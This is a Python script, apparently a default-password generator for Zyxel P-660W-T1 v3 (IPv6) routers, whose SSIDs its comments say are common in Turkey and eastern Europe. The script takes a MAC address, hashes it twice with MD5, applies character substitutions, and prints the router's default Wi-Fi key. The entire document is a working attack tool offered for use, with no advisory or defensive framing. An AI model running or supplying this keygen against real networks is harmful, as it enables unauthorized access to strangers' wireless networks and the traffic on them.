# keygen for the Zyxel P-660W-T1 v3(IPv6)
# SSID is zyxelddddlll or ZyXELddddlll seems to be found mostly in Turkey and eastern Europe
# Thenks to Selenium for his general purpose Qiling script for RasCode emulation that was modified to fit here.

import hashlib
import argparse

def p660w_t1_v3_ipv6(mac):

	mac_bytes = []
	mac_byte_values = []
	for i in range(0, 12, 2):
		mac_bytes.append(mac[i:i+2])
		mac_byte_values.append(int(mac[i:i+2], 16))


	digest1 = hashlib.md5()
	for i in mac_byte_values:
		digest1.update(i.to_bytes(length=1, byteorder='big'))
	digest2 = hashlib.md5()
	digest2.update(digest1.digest()[0:6])
	hex_digest2 = digest2.hexdigest()


	password = list(hex_digest2[:20:2])
	for i in range(0, 10):
		if password[i] == '5':
			password[i] = chr(digest2.digest()[i])
		elif password[i] == '0':
			password[i] = hex(digest2.digest()[i])[2:].upper()


	password = [i.lower() for i in password]
	password[0] = password[0].upper()
	password[5] = password[5].upper()
	password[6] = password[6].upper()
	password[8] = password[8].upper()
	password = "".join(password)
	
	print(password)

parser = argparse.ArgumentParser(description='Keygen for the Zyxel P-660W-T1 v3(IPv6)')
parser.add_argument('mac', help='Mac address')
args = parser.parse_args()

p660w_t1_v3_ipv6(args.mac)

